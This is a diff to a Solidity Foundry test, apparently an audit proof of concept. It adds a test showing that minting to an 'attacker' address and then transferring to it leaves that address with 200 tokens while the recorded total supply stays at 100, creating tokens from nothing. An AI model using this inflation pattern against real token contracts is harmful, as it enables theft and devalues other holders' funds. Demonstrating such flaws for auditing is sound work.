@@ -53,16 +53,24 @@ import "else/ERC20Token0x.sol";
 contract AttackPOC is Test {
 
     ERC20Token0x public token;
-    address public sender;
-    address public receiver;
+    address public attacker;
 
     function setUp() public {
         token = new ERC20Token0x(type(uint256).max);
-        
+        attacker = address(1);
     }
 
-    function test() public {
+    function test_InfiniteTokensCreation() public {
+        vm.prank(attacker);
+        token.mint(attacker, 100);
+        assertEq(token.totalSupply(), 100);
+        token.transfer(attacker, 100);
         
+        // now balance will be 200
+        assertEq(token._balanceOf(attacker), 200);
+
+        // totalSupply has not changed although there are new tokens in circulation
+        assertEq(token.totalSupply(), 100);
     }
 }
 
